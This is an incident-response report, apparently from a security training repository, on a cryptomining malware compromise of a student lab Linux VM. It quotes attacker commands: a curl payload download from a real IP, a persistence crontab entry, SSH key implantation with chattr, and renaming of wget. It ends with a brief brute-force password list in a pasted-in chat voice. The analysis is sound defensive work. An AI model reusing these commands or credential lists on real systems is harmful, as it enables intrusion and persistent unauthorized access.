## Executive Summary

The student Linux virtual machine `linux-programmatic-fix-michael` was compromised by an automated cryptocurrency mining malware campaign. The investigation was initiated following a Microsoft Defender for Endpoint alert indicating **Malware or  PUA (Potentially Unwanted Application)** Observed.

This incident occurred during an active **student lab exercise** in which the **root account password was intentionally set to `root`** to generate alerts during Tenable vulnerability scanning exercises. While expected in a controlled instructional environment, this configuration significantly weakened the system’s security posture and exposed the VM to real-world internet scanning and brute-force activity.

Telemetry confirms that an external actor successfully authenticated as `root`, downloaded and executed a malicious ELF binary, established persistence using legacy init scripts, renamed system utilities to evade detection, implanted SSH keys for long-term access, and deliberately destroyed forensic artifacts.

VirusTotal analysis of the recovered binary returned a **46 / 63 detection score**, classifying the file as a **Trojan**, confirming the activity was malicious and not the result of student experimentation or administrative automation.

# Investigation

### Initial Detection: Malware or PUA Observed in MDE

- MDE generates alert **Malware or PUA** activity on Linux host
- Alert correlated with suspicious processes occurring under `root`

<Br>

<br>

- MDE mapped a lengthy Process Tree, highlighting several suspicious processes:
   - Suspicious file dropped and launched
   - Suspicious shell command execution
   - Suspicious file or content ingress
   - Executable permission added to file or directory
   - Suspicious shell script launched
 
    <br>
   
- Along with potentially suspicious commands:
   - `wget` (Remote file download)
   - `curl` (Payload retrieval / C2 communication)
   - `chmod` (Permission modification for execution)
   - `cron` (Persistence via scheduled task, Linux scheduler)
   - `dash` (Lightweight shell used to execute scripts)
 
     <Br>

### First Look Into Compromised Device

- Multiple reconiassance commands observed:
   - `la -la` Lists files/directories, including hidden ones (-a) with permissions (-l)
   - `who` Shows logged-in users
   - `cat /etc/resolv.conf` reads contents of /resolv.conf, typically contains DNS resolver configuration
   - `uptime` Displays how long the system has been running, number of users, load averages
   - `cd /etc` hanges the working directory to /etc

```kql
DeviceProcessEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| order by TimeGenerated desc
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, InitiatingProcessParentFileName, ProcessCommandLine
```

<br>

- What this means:
   - A persistent root-level session existed for ~5 days
   - That session repeatedly executed _estimated thousands of_ short-lived binaries
   - Filenames were randomized: `owqtmtieus`, `nwvslhwzwf`, etc.
   - Each binary executs for ~5 seconds before writing a new file
   - Activity pattern indicates automation, not human typing
   - Behavior is inconsistent with legitimate admin activity
 
    <Br>

- Files are located at '/usr/bin'
   - Only root can write to `/usr/bin`
   - Regular users cannot create files there
   - It’s considered a protected system directory
   - **`/usr/bin/` survives reboots**
 
  <br>

<img width="734" height="391" alt="image" src="https://github.com/user-attachments/assets/5684e222-a1e2-49c1-9704-25df36ce4211" />

<br>

 - Even though the files are presumably the same:
   - Each SHA256 hash is different
   - File sizes change slightly
   - Malware could modify itself purposely to avoid detection
   - Things like wallet addresses and ports could change within the file

<img width="1184" height="470" alt="image" src="https://github.com/user-attachments/assets/5deb645c-ed6c-4d8c-bbab-548841fd69e9" />

- Session ID `79416`
   - Value is derived from Linux and added by MDE
   - Correlates sessions to file name randomization
   - Logs show **over 15,000** commands linking to the same session for this VM
   - All originating from the same ParentFile `ygljglkjgfg0`
   - Each command is within milliseconds of each other

```
Linux kernel:  creates session 79416
        ↓
MDE sensor:   observes + labels it
        ↓
Log Analytics: stores & exposes it
```

### Authentication Context and Lab Configuration

At the time of compromise, the VM was actively being used for a **student lab exercise** designed to trigger insecure authentication practices for Tenable scans.

Lab configuration included:
- SSH access intentionally exposed  
- **Root password set to `root`**  
- Expected vulnerability generation in Tenable for followup remediation

**Students are instructed to destroy VM asap when lab is finished** <Br>

### Student changes Root password | AHTKzAEv

- Student begins the lab, changing root password to _root_
   - `2026-01-30T13:50:32.826013Z` — `/etc/shadow` edited by _Labuser_ via root (student password change)
   - `2026-01-30T14:02:04.257228Z` ~12 minutes later, first suspicious file `/var/tmp/AHTKzAEv` is created
   - `AHTKzAEv` and its siblings appear in `/var/tmp` or `/usr/bin` with gibberish names, running as root processes

```kql
DeviceFileEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| order by TimeGenerated asc
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
```

<Br>

**File lifecycle after creation** 

- 2:02:04 — `AHTKzAEv` and multiple `x.sh` files created
   -  initial payload and helper scripts
- 2:02:04.957 — `retea` in `/dev/shm` created
   - `/dev/shm` is shared memory. malware sometimes drops helpers here for fast execution or stealth (RAM-only execution)
- 2:02:05 — `/root/.ssh/authorized_keys` updated
  - Allows persistence via SSH (attacker can log in without a password)
- 2:02:05 — `/etc/passwd` and `/etc/shadow` updated
   - Confirms the attacker escalated privileges / added backdoors, possibly adding a new root password
- Repeated FileCreated / FileDeleted events for `x.sh` and `AHTKzAEv`
   - This pattern suggests execution loops: run the script → collect data → delete temporary files → drop new scripts to continue
   - Deleting files is often to avoid forensic detection

     <Br>
     
```
/var/tmp/AHTKzAEv          <- the malicious binary
  └─ ygljglkjgfg0          <- child process / script spawned by AHTKzAEv
       └─ owqtmtieus       <- reconnaissance or mining scripts spawned by ygljglkjgfg0

```

<br>

### Malware Injects Password Hash for Root

- **Command:** usermod -p ********** root
   - `usermod` → Linux command used to modify a user account
   - `-p **********` → Sets the user’s password hash directly (not plaintext)
   - `root` → The username being modified

- ********** is the masked hash, so you don’t see it
- By replacing or adding a root hash with its own, malware creates a backdoor
- Student is still able to log in/won't get booted off

<br>

- This takes place just 12 minutes after student's password change
- Student wouldn't have had ample time to complete lab before device is compromised

### diicot

- `kuak` and `diicot` created in _tmp_ folder shortly after `AHTKzAEv`
   - both files ran long code meant to terminate any existing miners
<img width="1174" height="342" alt="image" src="https://github.com/user-attachments/assets/2161b4c2-df21-4a20-ba11-47370b34a5cc" />

- What this script is doing:
   - Terminating any potential competing malware/miners to free up CPU/resources
   - Setting up its working directory
   - Moving payload files into a hidden location
   - Making them executable
   - Running them in the background
   - Wiping evidence

<br>

### Root Cron Persistence

<br>

- `cron` is a built-in Linux utility for scheduling tasks
   - these cron processes start at: `2026-01-30T14:04:23.447447Z`
   - and go on until: `2026-02-02T22:47:03.418251Z`
- these Cron tasks run _every minute_
- cron drops `.b4nd1d0` into `/var/tmp/`
- Executes hidden payload
- Rewrites cron to ensure it stays installed
- This illustrates post-compromise persistence

<img width="1175" height="342" alt="image" src="https://github.com/user-attachments/assets/42f58afa-b9c0-4b16-a493-319739ba0942" /> <br>

<br>

- many _tmp._ files in `/var/spool/cron/crontabs/` (like `tmp.RYF9JE` and `tmp.SHGiEW`) along with root crontab activity
- These are temporary cron files created when the malware manipulates the root crontab
- crontab writes to temp files first, then rename them into place
   - That explains the frequent FileCreated + FileRenamed events — the malware is adding a scheduled job

     <br>
     
### .b4nd1d0 
- a _leetspeak_ spelling of "Bandito"
- Known Malware Associations
   - .b4nd1d0 has been observed in real Linux malware families in the wild
   - It’s typically a secondary payload, backdoor, or helper binary
   - Its consistent naming makes it easier for the malware’s cron/systemd scripts to find and execute it repeatedly

 <br>

<br>

### Malicious Binary Download p.txt

- curl http://**IP ADDRESS**/p.txt -o ygljglkjgfg0
   - `p.txt` malicious ELF binary
   - `ygljglkjgfg0` renamed executable copy
 
    <br>
   
<img width="1148" height="343" alt="image" src="https://github.com/user-attachments/assets/30eae789-719e-49e9-8338-21a71efeb701" />

<br> 

- malicious file output to `ygljglkjgfg0`
   - Downloaded via `curl` and `wget` from a remote host `23.160.56.194/p.txt`
   - First seen at `/usr/bin/ygljglkjgfg0` = persistent executable
   - Then copied to `/etc/init.d/ygljglkjgfg0` = run at boot
   - and `/etc/cron.hourly/gcc.sh` = run every hour or as scheduled
 
    <Br>

  <br>
  
- `ygljglkjgfg0` is the original parent file to spawn the many randomized file names from the start
  - EX. `tdrbhhtkky`, `omicykvmml`
- obfuscated file names:
  - Avoid hash-based detections
  - Avoids filename-based detections
  - Makes IOC-based hunting harder
  - Prevents defenders from blocking a single file
- These are clones or secondary payloads:
   - Backdoors
   - Miner binaries
   - Remote control scripts
 
   <br>

<Br>

**Crontab modification**
- The malware edits `/etc/crontab` to remove old references to `gcc.sh` and add a new entry:
   - `*/3 * * * * root /etc/cron.hourly/gcc.sh`
   - malware will now run every 3 minutes

   <br>

<br>

### p.txt SHA256 Hashes
<br>

- p.txt observations:
   - downloaded on two different devices
   - from same IP `23.160.56.194`
   - to the same file name `ygljglkjgfg`
   - on 1/27/2026 and 2/2/2026
   - both with the same file size `548616`
   - but with two different SHA256
 
<br>

<img width="1185" height="111" alt="image" src="https://github.com/user-attachments/assets/34ab995b-7b97-4eb8-9bc6-5828c76611c3" />

<br>
  
- Keep the same URL so all infected machines keep pulling the “latest version”
- FileType: Elf (Executable and Linkable Format) even though it's named .txt
   - Not actually a text file, but a compiled Linux binary
   - Name file .txt to avoid suspicion
   - Download → Rename → Execute 

 **VirusTotal page for both SHA256 Hashes**

 <br>
 
- **Observed behaviors from VirusTotal:**  
  - Cryptocurrency mining  
  - Process termination of competing miners  
  - Persistence installation  
  - Log destruction

### Binary Relocation and Renaming

The attacker deliberately renamed trusted system binaries:

`mv /usr/bin/wget /usr/bin/good` <br>
`mv /bin/wget /bin/good`  

Renaming trusted utilities allows continued payload delivery while bypassing simplistic detections that rely on binary names.

### Persistence via /etc/init.d

**`ygljglkjgfg0` is created/copied to _/etc/init.d/_**
-`/etc/init.d/` is used for startup services Linux systems
   - That means it would run automatically at boot
- This confirms **intentional long-term persistence**. 

<Br>

```kql
DeviceFileEvents  
| where DeviceName == "linux-programmatic-fix-michael"

### SSH Key Implantation

**A persistent SSH backdoor was implanted:**

<br>

```
chattr -ia ~/.ssh/authorized_keys  
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." > ~/.ssh/authorized_keys  
chattr +ai ~/.ssh/authorized_keys  
```

<br>

**Full command with annotations**
```bash
# --- Stage 1: Execute cleanup script ---
chmod +x clean.sh                # Make clean.sh executable
sh clean.sh                      # Run cleanup actions (likely remove temp files / old malware traces)
rm -rf clean.sh                  # Delete script to remove evidence

# --- Stage 2: Execute setup script ---
chmod +x setup.sh                # Make setup.sh executable
sh setup.sh                      # Run setup actions (likely prep malware staging directories)
rm -rf setup.sh                  # Delete script to remove evidence

# --- Stage 3: Create staging directory ---
mkdir -p *******                  # Create folder for malware payloads or data

# --- Stage 4: Prepare SSH for persistence ---
chattr -ia ~/.ssh/authorized_keys # Remove immutable/append-only flags so file can be overwritten

# --- Stage 5: Overwrite SSH authorized keys with attacker key ---
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... rsa-key-20230629" > ~/.ssh/authorized_keys

# --- Stage 6: Protect attacker key from removal ---
chattr +ai ~/.ssh/authorized_keys # Set immutable and append-only flags to prevent deletion or modification

# --- Stage 7: System reconnaissance / reporting ---
uname -a                          # Output system info (likely sent to attacker)
echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A" # Hex for "auth_ok" (signal success to C2)
```

<br>

**What this script is doing:**
   - Malware prepares environment (cleanup & setup scripts)
   - Staging directory created for payloads
   - SSH persistence established with attacker key
   - SSH key is protected from modification or removal
   - System info is exposed
   - Signal sent to confirm successful compromise
   - Student/root password changes are bypassed by attacker key

**Outcome:**
   - Full passwordless SSH access for attacker
   - Persistent backdoor hard to remove
   - Attacker added their own SSH key, alowing a silent login
   - depending on how system logs SSH, standard login record might not generate
   - This explains how the student wasn't booted: their account wasn’t actively interrupted

## Recommended Actions

### Immediate Recovery

- Redeploy affected virtual machines  
- Remove unauthorized init scripts  
- Rotate all credentials and SSH keys  
- Rebuild systems from trusted images  

### Monitoring Improvements

- Alert on writes to `/etc/init.d`  
- Monitor renaming of binaries in `/bin` and `/usr/bin`  
- Detect log truncation behavior  
- Alert on modifications to `authorized_keys`  
- Flag repeated download attempts from single external IPs

## Conclusion

This incident represents a **complete Linux system compromise** performed by automated malware exploiting weak authentication during a student lab exercise. While the insecure configuration was intentional for instructional purposes, it created conditions identical to real-world attack surfaces.

Microsoft Defender for Endpoint successfully detected the malicious activity, enabling investigation and confirmation of compromise. This case highlights how quickly exposed Linux systems can be compromised and reinforces the importance of monitoring persistence mechanisms, binary integrity, and log tampering — even in educational or non-production environments.

What the malware is doing with the IP scan

When it scans IPs in order (like your logs show), it’s basically probing other machines to see if it can connect. Specifically:

Ports 22 (SSH) → looking for servers that accept SSH connections.

2️⃣ What it’s trying after connecting

Once it finds a host that responds on one of these ports:

If SSH is open, the malware tries default or common passwords for user accounts.

From your earlier retea script, you can see it generates a big list of passwords for each Linux user:

If it successfully logs in with any of those passwords, it can:

Install itself on the new host

Run miners (like xmrig or cnrig)

Delete competing malware

Hide traces (clear logs, remove bash history)

3️⃣ Why your IPs descend
Each one gets a “ConnectionRequest” logged, whether it succeeds or fails.

root rootroot
root root123
root root123456
root 123456
root 123
